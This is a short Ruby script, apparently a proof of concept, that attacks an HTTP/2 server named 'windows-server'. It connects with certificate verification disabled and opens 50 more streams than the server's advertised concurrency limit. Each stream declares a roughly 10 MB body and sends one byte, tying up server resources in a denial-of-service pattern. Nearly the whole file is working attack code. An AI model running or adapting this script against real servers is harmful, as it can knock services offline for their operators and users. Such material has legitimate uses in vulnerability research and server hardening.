#!/usr/bin/env ruby

###################################################################
## Run this with ./max_concurrency.rb https://windows-server:port/

require 'http/2'
require 'socket'
require 'openssl'
require 'uri'

DRAFT = 'h2'.freeze

class Logger
  def initialize(id)
    @id = id
  end

  def info(msg)
    puts "[Stream #{@id}]: #{msg}"
  end
end

# this function creates the connection to the provided URL, and logs the details of what is being performed
def create_connection(url)
  uri = URI.parse(url)
  tcp = TCPSocket.new(uri.host, uri.port)

  $sock = nil
  log = Logger.new(-1)

  if uri.scheme == 'https'
    ctx = OpenSSL::SSL::SSLContext.new
    ctx.verify_mode = OpenSSL::SSL::VERIFY_NONE

    ctx.npn_protocols = [DRAFT]
    ctx.npn_select_cb = lambda do |protocols|
      puts "NPN protocols supported by server: #{protocols}"
      DRAFT if protocols.include? DRAFT
    end

    ctx.alpn_protocols = [DRAFT]

    $sock = OpenSSL::SSL::SSLSocket.new(tcp, ctx)
    $sock.sync_close = true
    $sock.hostname = uri.hostname
    $sock.connect

    if $sock.npn_protocol != DRAFT && $sock.alpn_protocol != DRAFT
      puts "Failed to negotiate #{DRAFT} via NPN/ALPN"
      return nil
    end
  else
    $sock = tcp
  end

  $conn = HTTP2::Client.new

  $conn.on(:frame) do |bytes|
    $sock.print bytes
    $sock.flush
  end

  $conn.on(:frame_sent) do |frame|
    log.info "Sent: #{frame.inspect}"
  end

  $conn
end

#########################################
# Core code is here:

uri = URI.parse(ARGV[0])
$conn = create_connection(ARGV[0])

if $conn == nil
  abort('Could not open connection')
end

header = {
    ':scheme' => 'https',
    ':method' => 'POST',
    ':authority' => "#{uri.host}:#{uri.port}",
    ':path' => '/',
    'content_length' => "#{1024*10240}"
}

max_streams = $conn.remote_settings[:settings_max_concurrent_streams]
max_streams += 50

# we just start a new stream over this HTTP/2 client connection, with a very large content length, and send a nominal amount of data
for i in 0..max_streams
  header[':path'] = "/#{i}"
  stream = $conn.new_stream
  stream.headers(header, end_stream: false)
  stream.data('A')
end
